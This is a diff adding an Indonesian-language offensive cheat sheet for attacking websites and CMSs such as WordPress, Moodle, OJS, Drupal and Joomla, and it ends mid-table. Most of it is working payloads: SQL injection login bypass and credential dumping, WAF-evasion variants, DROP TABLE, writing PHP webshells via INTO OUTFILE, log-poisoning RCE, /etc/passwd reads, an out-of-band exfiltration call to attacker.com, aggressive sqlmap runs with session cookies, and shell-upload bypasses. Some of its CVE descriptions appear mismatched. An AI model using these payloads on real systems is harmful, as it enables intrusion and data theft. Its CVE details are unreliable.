@@ -1,0 +1,905 @@
+Cari bug sql
+ctrl+u
+cari bagian
+<form action=
+atau
+file.php
+
+ 1. Cari: <form action=...>
+
+Contoh:
+
+<form action="login.php" method="POST">
+  <input type="text" name="username">
+  <input type="password" name="password">
+</form>
+
+Berarti request POST akan dikirim ke login.php dengan parameter username dan password
+Uji SQLi di field username atau password dengan payload seperti:
+' OR '1'='1
+
+cari: URL ke .php file dengan parameter
+
+<a href="product.php?id=5">View Product</a>
+Itu artinya URL mengandung parameter GET id=5.
+Bisa diuji SQLi dengan akses
+product.php?id=5'    --> lihat error atau perubahan tampilan
+product.php?id=5 AND 1=1
+product.php?id=5 AND 1=2
+Kalau halaman berubah antara 1=1 (benar) dan 1=2 (salah) — bisa SQLi ✅
+
+| Kata Kunci HTML     | Tujuan                                   |
+| ------------------- | ---------------------------------------- |
+| `action=`           | Menemukan file target POST               |
+| `.php?`             | Cari parameter GET rentan SQLi           |
+| `method="POST"`     | Tandanya form bisa diuji input injection |
+| `input name=`       | Lihat nama parameter dikirim ke server   |
+| `select`, `option`  | Kadang parameter berasal dari dropdown   |
+| `search.php?query=` | Target yang sering rentan SQLi           |
+
+| Contoh URL/HTML                            | Analisis                            |
+| ------------------------------------------ | ----------------------------------- |
+| `login.php`                                | Coba inject di username/password    |
+| `search.php?query=abc`                     | SQLi di parameter `query`           |
+| `<form action="submit.php" method="post">` | Coba inject di semua input form-nya |
+| `<a href="view.php?id=10">`                | Coba ubah `id=10` jadi SQL payload  |
+
+
+Payload Uji Cepat SQLi:
+1' OR '1'='1
+' OR 1=1 --
+' AND 1=2 --
+1' ORDER BY 5 --
+1' UNION SELECT null, null --
+
+
+SQL Injection teknik lanjutan dan alternatif, termasuk bypass modern, fungsi tersembunyi, dan kombinasi unik
+
+🔥 1. Inline Subquery Injection
+?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
+Mengetes apakah user tertentu ada tanpa melihat hasil query.
+
+🔥 2. Stacked Queries (jika DB mengizinkan, misal PostgreSQL, MySQL jika multi_query aktif)
+?id=1; DROP TABLE users; --
+Contoh ekstrem – kirim dua query dalam satu request.
+
+🔥 3. Error-based Bypass (fungsi tersembunyi)
+
+?id=1' AND updatexml(1,concat(0x7e,database()),1) --
+Output:
+
+XPATH syntax error: '~yourdbname'
+Atau:
+extractvalue(1,concat(0x7e,(SELECT user())))
+
+🔥 4. Time-Based Bypass (Blind SQLi)
+?id=1' AND IF(1=1,SLEEP(5),0) --
+Kalau delay 5 detik → server eval ekspresi → ✅ vulnerable.
+
+| Target Diblok     | Bypass Alternatif                           |
+| ----------------- | ------------------------------------------- |
+| `UNION SELECT`    | `UNIunionON SEselectLECT` (dibagi karakter) |
+| `SELECT`          | `SEL/**/ECT`, `S/*!00000ELECT*/`            |
+| `' OR '1'='1`     | `'%20OR%20'1'%3D'1` (URL-encoded)           |
+| `--`              | `#`, `%23`, `/*`                            |
+| `SLEEP(5)` diblok | `benchmark(10000000,MD5(1))`                |
+
+🔥 6. Second-order SQL Injection
+Parameter terlihat aman saat disimpan, tapi dievaluasi di proses lain.
+
+Contoh:
+
+Form input email=' or 1=1 -- disimpan ke database.
+
+Proses reset password baca field tersebut → dievaluasi → SQLi!
+
+🔥 7. Boolean Obfuscation
+Jika:
+?id=1' AND 1=1 --
+Diblokir, coba:
+?id=1' && 1=1 #
+?id=1' OR 1 LIKE 1 #
+?id=1' OR ASCII(SUBSTRING(version(),1,1))=52 #
+
+🔥 8. Using INFORMATION_SCHEMA untuk eksploitasi data schema
+Cek semua tabel:
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+Cek semua kolom:
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+
+🔥 9. Bypass LIMIT dan OFFSET untuk enum data
+' UNION SELECT username, password FROM users LIMIT 1 OFFSET 0 -- 
+' UNION SELECT username, password FROM users LIMIT 1 OFFSET 1 -- 
+Looping lewat data satu per satu (seperti blind enum manual).
+
+🔥 10. Out-of-Band SQLi (DNS exfiltration)
+Hanya jika target mengizinkan koneksi keluar:
+LOAD_FILE('\\\\attacker.com\\x') 
+Atau gunakan payload dari tools seperti sqlmap --dns-domain.
+
+| Tempat                   | Contoh                            |
+| ------------------------ | --------------------------------- |
+| HTTP Header (User-Agent) | Header: `User-Agent: ' OR 1=1 --` |
+| Cookie                   | `Cookie: session=xyz' OR 1=1 --`  |
+| Referer                  | Referer: `' OR 1=1 --`            |
+| JSON/POST                | `{"id": "1' OR 1=1 --"}`          |
+
+
+🧠 1. SQL Injection via User-Agent Header
+
+GET /profile.php HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0' OR 1=1 --
+
+📌 Kalau User-Agent disimpan ke database (untuk statistik/log) tanpa filtering, bisa terjadi second-order SQLi.
+➕ Tips:
+Gunakan Burp Suite → tab Intruder atau Repeater
+
+Atau pakai curl:
+curl -A "' OR 1=1 --" http://target.com/page.php
+
+🍪 2. SQL Injection via Cookie Header
+GET /dashboard.php HTTP/1.1
+Host: target.com
+Cookie: session_id=123' OR '1'='1
+📌 Banyak sistem menyimpan session token, ID pengguna, atau preferensi di cookie → jika digunakan dalam query SQL, maka bisa disuntik.
+➕ Curl:
+curl -H "Cookie: id=1' OR 1=1 --" http://target.com/page.php
+
+🌐 3. SQL Injection via Referer Header
+
+GET /index.php HTTP/1.1
+Host: target.com
+Referer: http://evil.com/' OR '1'='1
+📌 Jika Referer digunakan dalam query (misalnya: tracking asal pengunjung) tanpa sanitasi → rentan.
+➕ Curl:
+curl -e "' OR 1=1 --" http://target.com/
+
+🔧 4. SQL Injection via JSON / POST Body
+Misal endpoint:
+
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "' OR '1'='1"
+}
+
+Atau form biasa (x-www-form-urlencoded):
+
+POST /login.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=' OR '1'='1
+
+➕ Curl JSON:
+
+curl -X POST http://target.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "'\'' OR '\''1'\''='\''1"}'
+
+| Cara                      | Tools/Metode                     |
+| ------------------------- | -------------------------------- |
+| Intercept pakai BurpSuite | Ubah header saat request         |
+| Pakai curl & modifikasi   | Header: `-H`, Cookie: `--cookie` |
+| Lihat di source code HTML | Form `action`, JS `fetch()`      |
+| Gunakan `sqlmap` otomatis | `--level=5 --risk=3`             |
+
+💣 SQLMAP untuk Tes Header
+sqlmap -u http://target.com/page.php --headers="User-Agent: ' OR 1=1 --"
+sqlmap -u http://target.com/ --cookie="id=1' OR 1=1 --"
+
+
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+coba tes inject manual atau sqlmap
+
+Contoh Manual Boolean-Based:
+?id=1' AND 1=1 --     ✅ benar → halaman normal
+?id=1' AND 1=2 --     ❌ salah → halaman error atau kosong
+Kalau respons berubah, berarti rentan terhadap Boolean-based blind
+
+Contoh Manual Error-Based:
+?id=1' AND updatexml(1, concat(0x7e, (SELECT database())), 1) -- 
+Kalau keluar error: XPATH syntax error: '~database_name' → vuln ✅
+
+Contoh Manual UNION-Based:
+?id=1' ORDER BY 1 --
+?id=1' ORDER BY 2 --
+Setelah tahu jumlah kolom (misal 3), coba:
+?id=-1' UNION SELECT 1,2,3 --
+
+Contoh Manual Time-Based:
+?id=1' AND SLEEP(5) -- 
+
+Arti Singkatan --technique=BEUSTQ di sqlmap
+| Huruf | Teknik SQLi                | Penjelasan Singkat                                                              |
+| ----- | -------------------------- | ------------------------------------------------------------------------------- |
+| **B** | Boolean-based blind        | Jawaban *benar/salah* tanpa melihat data langsung. Contoh: `AND 1=1`, `AND 1=2` |
+| **E** | Error-based                | Memanfaatkan pesan error database untuk ekstraksi data                          |
+| **U** | UNION query                | Menggabungkan hasil dengan `UNION SELECT` untuk ekstraksi data                  |
+| **S** | Stacked queries            | Mengirim beberapa query dalam satu kali permintaan (`; SELECT ...`)             |
+| **T** | Time-based blind           | Menggunakan delay (seperti `SLEEP(5)`) untuk deteksi kondisi benar/salah        |
+| **Q** | Inline query (out-of-band) | SQLi via DNS atau HTTP out-of-band (jarang berhasil, tapi powerful jika jalan)  |
+
+SQL + LFI Kombinasi (SQL2LFI)
+
+?id=1 UNION SELECT 1, load_file('/etc/passwd'), 3 --
+Kalau berhasil, isi /etc/passwd ditampilkan di kolom ke-2 halaman
+?id=1 UNION ALL SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
+
+LFI Basic
+?page=../../../../etc/passwd
+
+| Tujuan                    | Bypass                                                     |
+| ------------------------- | ---------------------------------------------------------- |
+| Bypass `.php`             | `?page=../../../../etc/passwd%00` (**PHP <5.3**)           |
+| Encode `../`              | `..%2f..%2fetc%2fpasswd`<br>`....//....//etc/passwd`       |
+| Bypass ekstensi `.php`    | `?page=php://filter/convert.base64-encode/resource=config` |
+| Read dengan `php://input` | POST shell ke `php://input` dan include                    |
+
+Contoh Kombinasi SQL + LFI di Server
+
+Misal: ?id=1 SQLi → Kita bisa
+UNION SELECT "<?php system($_GET['x']); ?>" INTO OUTFILE '/var/www/html/x.php'
+?page=../../uploads/x.php
+
+LFI Exploit Tips
+?page=php://filter/convert.base64-encode/resource=index
+Hasilnya: base64 dari source code index.php.
+
+Real Exploit LFI → RCE
+LFI bisa jadi RCE jika:
+Kamu bisa menyisipkan kode di log (access log / error log)
+Kamu tahu path log
+
+# Kirim user-agent:
+curl -A "<?php system($_GET['cmd']); ?>" http://target
+
+# Akses:
+?page=/var/log/apache2/access.log&cmd=id
+
+Boom! Kamu eksekusi perintah via log file 🧨
+
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+🧠 1. Apakah WordPress Core Rentan SQLi?
+Tidak. WordPress Core (wp-includes, wp-admin, wp-content) sangat dijaga dan pakai $wpdb->prepare() untuk semua query.
+Tapi… plugin & theme custom sering abaikan prepare(), dan inilah tempat SQLi sering ditemukan.
+
+🔥 2. Tempat SQL Injection Umum di WordPress:
+
+| Tempat                                | Contoh                                              |
+| ------------------------------------- | --------------------------------------------------- |
+| Plugin yang query langsung            | `SELECT * FROM wp_users WHERE email='$_GET[email]'` |
+| Theme custom with SQL query           | `$_POST['search']` langsung disisipkan ke query     |
+| AJAX endpoint custom (admin-ajax.php) | Banyak plugin register action yang tidak aman       |
+| REST API endpoint (wp-json)           | Plugin REST custom bisa raw query                   |
+
+💣 3. Contoh Plugin Rentan SQLi
+✅ Contoh nyata (kerentanan lama):
+Plugin: WP Statistics (versi < 12.6.7)
+Endpoint: /wp-admin/admin.php?page=wpstatistics
+Parameter: id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --
+
+✅ Plugin lain yang pernah rentan:
+WP Google Maps
+
+Formidable Forms
+
+Events Manager
+
+Gallery Plugins
+
+🔍 4. Contoh Manual SQLi di Plugin WordPress
+http://target.com/wp-admin/admin-ajax.php?action=get_data&id=1' AND SLEEP(5) --
+Kalau delay terjadi → vulnerable to Time-Based Blind SQLi
+
+🛠 5. Deteksi SQLi di WordPress Secara Otomatis
+Gunakan sqlmap + parameter --forms --level=5 --risk=3:
+sqlmap -u "http://target.com/wp-admin/admin.php?page=plugin-name&id=1" --cookie="wordpress_logged_in=..." --level=5 --risk=3 --random-agent
+
+🔒 6. Tips Pendeteksian Manual
+Cek parameter id=, user=, search=, post=, cat=
+
+Lihat file admin-ajax.php?action=...
+
+Gunakan plugin enum tools:
+wpscan
+WPVulnDB
+
+🧪 7. Payload Uji WordPress Plugin SQLi
+1' AND 1=1 --
+1' AND 1=2 --
+1' OR SLEEP(5) --
+1' UNION SELECT null, user(), database() --
+
+🔐 8. Contoh Plugin Custom Rentan
+$id = $_GET['id'];
+$sql = "SELECT * FROM wp_posts WHERE ID = $id";
+$wpdb->get_results($sql);
+
+Payload:
+?id=1 UNION SELECT 1,2,version(),4,5,6,7
+
+🚀 9. Cara Cek SQLi di WP dengan sqlmap (rekomendasi)
+Login admin → ambil cookie wordpress_logged_in=...
+
+Akses plugin URL:
+http://target.com/wp-admin/admin.php?page=some-plugin&id=5
+Scan:
+sqlmap -u "http://target.com/wp-admin/admin.php?page=some-plugin&id=5" --cookie="wordpress_logged_in=..." --level=5 --risk=3 --batch
+
+_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+🎯 1. Apakah Moodle Core Rentan SQLi?
+Biasanya tidak, karena Moodle menggunakan get_records_sql(), get_record() dengan parameterized query (binding). Tapi...:
+
+Jika developer plugin membangun SQL langsung dari input → bisa terjadi SQLi.
+
+Beberapa kerentanan telah ditemukan di versi lama (misalnya CVE-2020-14321, CVE-2019-19676).
+
+📚 2. Beberapa CVE SQLi di Moodle (Contoh Nyata)
+| CVE-ID             | Versi Rentan   | Deskripsi Singkat                                     |
+| ------------------ | -------------- | ----------------------------------------------------- |
+| **CVE-2020-14321** | Moodle < 3.8.2 | SQLi di core melalui *message search filter*          |
+| **CVE-2019-19676** | Moodle < 3.7.3 | SQL Injection via the `grade/report/grader/index.php` |
+| **CVE-2013-4513**  | Moodle 2.5.2   | Injection di parameter `userid` dalam forum           |
+
+🧪 3. Contoh Manual SQLi Moodle (Lokal/Plugin)
+
+a. Rentan di parameter userid= (versi lama):
+https://moodle.site/grade/report/grader/index.php?userid=1' AND SLEEP(5) --
+Kalau delay → vulnerable
+b. Forum search (CVE-2020-14321)
+POST /message/index.php
+Content-Type: application/x-www-form-urlencoded
+
+usersearch=admin%' AND SLEEP(5) -- 
+
+🔐 4. Login Moodle Diperlukan untuk Tes Banyak SQLi
+Karena sebagian besar endpoint Moodle ada di /user/*, /grade/*, /message/* yang memerlukan login terlebih dahulu.
+
+Ambil cookie MoodleSession=... dari browser, lalu gunakan:
+
+sqlmap -u "https://moodle.site/grade/report/grader/index.php?userid=1" --cookie="MoodleSession=abcdef123456" --level=5 --risk=3
+
+🛠 5. Tools Bantu: sqlmap + login Moodle
+Login sebagai user biasa atau admin
+Buka dev tools → Network → cari cookie MoodleSession
+Coba target URL seperti:
+/grade/report/
+/message/index.php
+/user/*
+/admin/tool/
+
+📂 6. Target Parameter Umum Rentan SQLi di Moodle
+
+| Endpoint                        | Parameter                 |
+| ------------------------------- | ------------------------- |
+| `grade/report/grader/index.php` | `id`, `userid`            |
+| `message/index.php`             | `usersearch`, `messageid` |
+| `mod/quiz/report/attempts.php`  | `userid`, `quizid`        |
+| `user/profile.php`              | `id`                      |
+| Plugin tertentu (3rd party)     | Bisa banyak param         |
+
+⚠️ 7. Moodle Plugin Rentan SQLi (contoh terdahulu)
+- Configurable Reports Plugin (block_configurable_reports)
+- Gradebook report plugins
+- Custom SQL Report block
+
+🧠 8. Cara Scan SQLi di Moodle dengan sqlmap
+
+sqlmap -u "https://target.moodle/grade/report/grader/index.php?userid=1" --cookie="MoodleSession=xyz" --level=5 --risk=3 --batch --random-agent
+
+🚀 9. Tips Manual Tes
+Uji cepat:
+?id=1 AND 1=1
+?id=1 AND 1=2
+?id=1' AND SLEEP(5) --
+?id=1' UNION SELECT null, null, database() --
+
+_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+🧩 1. SQL Injection di OJS (Open Journal Systems)
+
+✅ Potensi Titik Serangan:
+Parameter searchQuery, author, title dalam pencarian jurnal
+
+URL seperti:
+/index.php/[journal]/search/search?query=' OR 1=1--
+Modul URL:
+
+login, user, manager, reviewer, submission, announcement
+
+🔍 Contoh Payload:
+
+/index.php/test/search/search?query=' OR 1=1--
+📌 Cek dengan:
+HTTP GET / POST parameter
+
+Header seperti Cookie / Referer
+
+JSON body (jika OJS versi baru pakai REST)
+
+🛠 Tips Eksekusi:
+Gunakan sqlmap:
+
+sqlmap -u "http://target.com/index.php/test/search/search?query=test" --dbs
+
+🧩 2. SQL Injection di Web App Umum (Custom CMS / Framework)
+
+Titik Umum:
+Form login (username / password)
+
+Form pencarian
+
+Filter (GET parameter: id, page, cat, sort, dsb.)
+
+API endpoints JSON/POST
+
+🔍 Contoh GET vulnerable:
+
+/news.php?id=1' OR '1'='1
+🔍 Contoh POST vulnerable:
+
+POST /login.php
+username=admin'--&password=apaaja
+🔍 Contoh JSON vulnerable:
+{
+  "username": "admin'--",
+  "password": "abc"
+}
+🔍 Contoh Cookie vulnerable:
+Cookie: auth=1' OR '1'='1
+🔍 Header vulnerable:
+User-Agent: ' OR 1=1--
+Referer: ' OR 1=1--
+
+🔓 Bypass SQL Injection
+
+| Teknik               | Contoh                                            |
+| -------------------- | ------------------------------------------------- |
+| Bypass `'` pakai `"` | `" OR "1"="1`                                     |
+| Bypass login         | `admin'--`, `admin"#`, `admin')--`                |
+| Comment gaya lain    | `--+`, `#`, `/*`                                  |
+| Encoding             | `%27 OR 1=1--`, `%2527`                           |
+| Case tweak           | `SeLeCt`, `UnIoN`                                 |
+| Delay-based          | `' OR SLEEP(5)--`                                 |
+| WAF bypass           | `/*!50000SELECT*/`, `0x61646d696e`                |
+| Nested injection     | `id=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--` |
+
+📚 Penutup
+Jika ingin scan otomatis:
+sqlmap -u "http://target.com/vuln.php?id=1" --batch --random-agent --level=5 --risk=3
+
+
+🔍 1. SQL Injection (SQLi)
+✅ Target: CMS seperti OJS, Moodle, WordPress
+Ciri endpoint rawan SQLi:
+
+URL: search.php?q=, id=, view.php?id=, filter=, page=
+
+Form: input pencarian, login, filter data
+
+Parameter via GET, POST, JSON, Cookie, Header, dll
+
+Tempat SQLi bisa disisipkan:
+
+GET: page.php?id=1
+
+POST: username=admin&password=' OR '1'='1
+
+Header: User-Agent: ' OR 1=1 -- -
+
+Cookie: session=abc' OR '1'='1
+
+JSON: { "search": "abc' OR 1=1 -- " }
+
+WordPress:
+
+Tergantung plugin, contohnya:
+
+Plugin REST API vulnerability: wp-json/wp/v2/users
+
+Plugin vulnerable to parameter like ?id= (e.g., RevSlider)
+
+Moodle:
+
+grade/report/grader/index.php?id=...
+
+user/index.php?course=...
+
+Banyak celah historis dari query langsung (biasanya perlu login)
+
+OJS (Open Journal Systems):
+
+search/search.php?query=
+
+issue/view.php?volume=...
+
+Beberapa versi lama vulnerable saat filter data jurnal
+
+🕳️ 2. Local File Inclusion (LFI)
+LFI endpoint umum:
+
+?page=../../../../etc/passwd
+
+?module=include.php
+
+?file=menu.php
+
+Bypass teknik:
+
+Null byte (jika PHP <5.3): file=../../etc/passwd%00
+
+Double encoding: file=..%252f..%252f..%252fetc%252fpasswd
+
+Filter bypass: file=....//....//etc/passwd
+
+Wrappers: php://filter/convert.base64-encode/resource=config.php
+
+Data stream (bisa untuk RCE): php://input + POST shell
+
+Target CMS:
+
+WordPress: jarang LFI, tapi plugin bisa salah include file
+
+Moodle: sebagian modul plugin custom bisa LFI
+
+OJS: LFI pernah muncul di modul include.php atau tools/
+
+⚙️ 3. Endpoint RCE (shell_exec, system)
+Laravel (khusus debug aktif):
+
+/_ignition/execute-solution
+
+Bug: [CVE-2021-3129] → Remote shell via log poisoning
+
+Payload:
+
+Kirim User-Agent: <?php system($_GET['cmd']); ?>
+
+Akses Ignition endpoint:
+
+POST /_ignition/execute-solution
+{
+  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+  "parameters": {
+    "variableName": "test",
+    "viewFile": "/storage/logs/laravel.log"
+  }
+}
+CMS lain:
+
+WordPress: RCE via plugin vuln (misalnya File Manager, timthumb)
+
+Moodle: beberapa RCE via upload plugin atau path traversal
+
+OJS: RCE via file upload vuln atau plugin modif
+
+🛠 Tools & Manual Testing Tips:
+SQLi Manual:
+' OR '1'='1
+' UNION SELECT null, user(), database(), version()--
+' AND (SELECT COUNT(*) FROM users) > 0 --
+LFI Manual:
+?page=../../../../etc/passwd
+?file=php://filter/convert.base64-encode/resource=config.php
+
+WP Fastest Cache 1.2.2 - SQL Injection (Unauthenticated)
+1. Deskripsi
+Plugin WP Fastest Cache versi 1.2.2 dan sebelumnya memiliki celah SQL Injection yang dapat dieksploitasi tanpa harus login (unauthenticated). Celah ini terjadi karena input dari parameter HTTP (biasanya GET atau POST) disisipkan langsung ke query tanpa sanitasi.
+
+2. Cara Kerja Bug
+Parameter yang rentan dieksploitasi misalnya pada request ajax atau endpoint tertentu yang menjalankan query tanpa filtering.
+🔥 Contoh Payload Exploit
+Misalkan endpoint rentan ada di:
+
+http://target.com/wp-admin/admin-ajax.php?action=some_action&param=1
+Kamu bisa coba injeksi payload SQL:
+
+http://target.com/wp-admin/admin-ajax.php?action=some_action&param=1' OR 1=1 --
+Atau payload blind time-based:
+
+http://target.com/wp-admin/admin-ajax.php?action=some_action&param=1' AND SLEEP(5) --
+Kalau ada delay, berarti vulnerable.
+
+💥 Exploit Otomatis dengan sqlmap
+sqlmap -u "http://target.com/wp-admin/admin-ajax.php?action=some_action&param=1" --batch --level=5 --risk=3
+Tambahkan cookie WordPress jika butuh login, tapi kalau ini unauthenticated, kemungkinan nggak perlu.
+
+
+Kalau kamu mau tahu file PHP atau endpoint apa saja yang memakai kode seperti:
+
+Kalau kamu mau tahu file PHP atau endpoint apa saja yang memakai kode seperti:
+$response = json_decode(shell_exec($cURL));
+itu artinya ada pemanggilan perintah shell lewat shell_exec(), hasilnya JSON, lalu di-decode ke variabel $response.
+
+Ini biasanya ada di:
+1. Shell / Backdoor PHP
+File yang jadi shell uploader, remote code execution, backdoor biasa menggunakan shell_exec() untuk jalankan perintah OS.
+
+Biasanya file bernama:
+
+shell.php
+
+backdoor.php
+
+cmd.php
+
+exec.php
+
+file.php (jika digunakan untuk command execution)
+
+2. API Endpoint yang Menjalankan Command
+Endpoint REST API atau AJAX yang menjalankan perintah server, lalu mengirim JSON response.
+
+Contoh:
+
+/api/exec.php
+
+/admin/command.php
+
+/ajax/exec_command.php
+
+3. Tools Manajemen Server Web (Panel Admin)
+Misal: file panel hosting/custom CMS yang menyediakan fitur terminal via web.
+
+Cara mencari file atau endpoint ini:
+Jika punya akses file server, cari di shell:
+
+grep -rl "shell_exec" /path/to/webroot
+atau lebih spesifik:
+
+grep -rl "json_decode(shell_exec" /path/to/webroot
+Jika hanya akses URL dan mau cek secara manual:
+Coba endpoint populer yang sering punya fitur exec:
+
+file.php
+
+cmd.php
+
+exec.php
+
+shell.php
+
+api.php
+
+/ajax/exec.php
+
+Kirim request parameter yang mengandung perintah shell, misalnya:
+
+?cmd=ls
+
+1. Drupal
+Bug Upload Shell Umum & Endpoint Exploit
+CVE-2018-7600 (Drupalgeddon 2) — RCE tanpa login, sering pakai endpoint:
+
+/user/register
+
+/user/password
+
+/node/add/article (upload gambar/file)
+
+Modul upload file dan image field rentan jika tidak validasi.
+
+Endpoint upload eksploitasi:
+/system/ajax dengan payload yang mengeksekusi PHP.
+
+Lokasi Upload Shell
+/sites/default/files/
+
+/sites/default/files/tmp/
+
+/sites/default/files/styles/
+
+Teknik Bypass
+Rename ekstensi shell: .php5, .phtml
+
+Double extension: shell.php.jpg
+
+Upload dengan header MIME palsu
+
+2. PrestaShop
+Bug Upload Shell Umum & Endpoint Exploit
+Modul upload gambar produk:
+Endpoint: /admin123/index.php?controller=AdminProducts
+
+Modul pihak ketiga dengan upload tanpa validasi
+
+Exploit upload shell via POST ke:
+/modules/yourmodule/ajax-upload.php (contoh modul rentan)
+
+Lokasi Upload Shell
+/img/
+
+/upload/
+
+/modules/
+
+Teknik Bypass
+Ekstensi .php5, .phtml
+
+Double extension
+
+MIME spoofing
+
+3. Joomla
+Bug Upload Shell Umum & Endpoint Exploit
+Media Manager: upload file di /administrator/index.php?option=com_media
+
+Upload di artikel (jika editor izinkan upload file)
+
+Plugin pihak ketiga (file uploader) rentan
+
+Exploit upload shell lewat endpoint:
+/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager.php (JCE File Manager)
+
+Lokasi Upload Shell
+/images/
+
+/images/stories/
+
+/media/
+
+Teknik Bypass
+Double extension .php.jpg
+
+.php5, .phtml
+
+Upload file gambar berisi PHP (polyglot)
+
+4. Moodle
+Bug Upload Shell Umum & Endpoint Exploit
+Assignment upload: /mod/assign/view.php?id=...
+
+Plugin upload custom atau modul file manager
+
+Endpoint upload:
+/lib/ajax/service.php (bisa disalahgunakan di plugin rentan)
+
+Lokasi Upload Shell
+/filedir/ (folder penyimpanan file)
+
+/mod/assign/
+
+/mod/resource/
+
+Teknik Bypass
+Upload file .txt atau .html lalu rename
+
+Upload shell dengan ekstensi diizinkan
+
+Upload via LFI untuk jalankan shell
+
+Rekomendasi
+Selalu update CMS & plugin.
+
+Scan dengan tools seperti wpscan, joomscan, droopescan, moodler
+
+Gunakan WAF untuk memblok upload berbahaya.
+
+Cek folder upload yang bisa dieksekusi, ubah permission.
+
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Daftar CMS dan Jenis Bug Umumnya
+
+| CMS            | Jenis Bug Umum                                   | Penjelasan Singkat                                                                                              |
+| -------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
+| **WordPress**  | SQL Injection, XSS, CSRF, File Upload, RCE       | Plugin/theme rentan, REST API user enumeration, file manager RCE, XML-RPC brute force, insecure deserialization |
+| **Drupal**     | SQL Injection, RCE, LFI, Auth Bypass             | Drupalgeddon, AJAX endpoint bypass, file upload tanpa validasi, LFI di modul custom                             |
+| **Joomla**     | File Upload, XSS, SQLi, RCE                      | Media Manager upload vuln, component exploit (JCE), plugin vulnerable, CSRF di admin                            |
+| **Moodle**     | SQL Injection, File Upload, Privilege Escalation | Plugin upload tanpa validasi, parameter injection, weak permissions, RCE via plugin                             |
+| **Prestashop** | File Upload, SQL Injection, CSRF, XSS            | Image upload tanpa filter, modul pihak ketiga, CSRF di admin panel, SQLi di filter produk                       |
+| **Magento**    | RCE, SQL Injection, CSRF, XSS                    | SOAP API vulns, admin path bruteforce, insecure deserialization, file upload                                    |
+| **Typo3**      | SQLi, XSS, File Inclusion, Privilege Escalation  | Plugin injection, backend module bypass, LFI via parameters                                                     |
+| **OpenCart**   | File Upload, SQLi, XSS, CSRF                     | Product image upload, filter injection, CSRF in checkout modules                                                |
+| **Concrete5**  | XSS, RCE, File Upload                            | File manager bypass, insecure permissions, CSRF                                                                 |
+| **Ghost**      | XSS, Authentication Bypass                       | API token leak, cross-site scripting, session fixation                                                          |
+| **OctoberCMS** | RCE, SQLi, CSRF                                  | Plugin injection, unsafe eval, SQL injection in plugin API                                                      |
+| **MediaWiki**  | XSS, CSRF, Injection                             | Parser function exploit, upload file vulnerabilities                                                            |
+| **Typo3**      | LFI, SQLi, RCE                                   | Input parameter injection, backend admin bypass                                                                 |
+| **osCommerce** | SQLi, File Upload, XSS                           | Weak admin authentication, file upload via addons                                                               |
+| **MODX**       | XSS, RCE, SQLi                                   | Snippet injection, file upload, parameter injection                                                             |
+| **Bitrix**     | RCE, SQLi, XSS                                   | Vulnerable modules, file inclusion, authentication bypass                                                       |
+
+Jenis Bug Umum dan Penjelasan
+
+| Jenis Bug                             | Penjelasan                                                                    | Contoh                                                         |
+| ------------------------------------- | ----------------------------------------------------------------------------- | -------------------------------------------------------------- |
+| **SQL Injection (SQLi)**              | Input tidak tervalidasi menyebabkan query SQL disisipkan kode berbahaya       | `id=1 OR 1=1`, `UNION SELECT`, blind SQLi dengan `SLEEP()`     |
+| **Cross-Site Scripting (XSS)**        | Script jahat disisipkan di input dan dijalankan di browser korban             | Input komentar/username script `<script>alert(1)</script>`     |
+| **Cross-Site Request Forgery (CSRF)** | Permintaan palsu dikirimkan atas nama user tanpa izin                         | Form transfer dana tanpa token CSRF                            |
+| **Remote Code Execution (RCE)**       | Penyerang dapat menjalankan kode berbahaya di server                          | Upload webshell, exploit deserialization, injection eval/exec  |
+| **File Upload Vulnerability**         | Upload file berbahaya (shell, backdoor) tanpa filter validasi                 | Upload `.php` shell, bypass ekstensi filter, double extension  |
+| **Local File Inclusion (LFI)**        | Termasuk file lokal tanpa validasi, bisa baca file sensitif atau eksekusi PHP | `?page=../../../../etc/passwd`, `php://input`                  |
+| **Authentication Bypass**             | Akses admin atau user tanpa otentikasi                                        | Login tanpa password lewat bug login                           |
+| **Privilege Escalation**              | User biasa dapat naik jadi admin / root                                       | Bug di modul admin, injeksi parameter, ACL salah konfigurasi   |
+| **Session Fixation / Hijacking**      | Sesi user dicuri atau dipaksa untuk akses                                     | Cookie sesi dicuri, token CSRF lemah                           |
+| **Insecure Deserialization**          | Deserialize data tak terpercaya mengeksekusi kode berbahaya                   | PHP unserialize payload dengan objek berbahaya                 |
+| **Open Redirect**                     | Pengalihan ke situs jahat melalui parameter URL                               | `redirect=http://evil.com`                                     |
+| **XML External Entity (XXE)**         | Parsing XML yang mengakses file lokal atau jaringan luar                      | `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` |
+
+Contoh CMS dengan bug populer dan CVE-nya
+
+| CMS        | Contoh Bug / CVE                  | Keterangan                           |
+| ---------- | --------------------------------- | ------------------------------------ |
+| WordPress  | File Manager RCE (CVE-2020-28036) | Upload shell via plugin              |
+| Drupal     | Drupalgeddon2 (CVE-2018-7600)     | RCE tanpa login                      |
+| Joomla     | JCE File Manager (CVE-2015-8562)  | Upload shell via komponen            |
+| Moodle     | SQLi (CVE-2020-14321)             | Parameter injection di modul message |
+| Prestashop | SQLi di modul filter produk       | Eksploitasi tanpa autentikasi        |
+| Magento    | RCE via SOAP API (CVE-2019-8144)  | Eksploitasi admin API                |
+
+Jenkins dan Bug Umumnya
+
+| Jenis Bug                              | Penjelasan & Contoh                                                                                                          |
+| -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
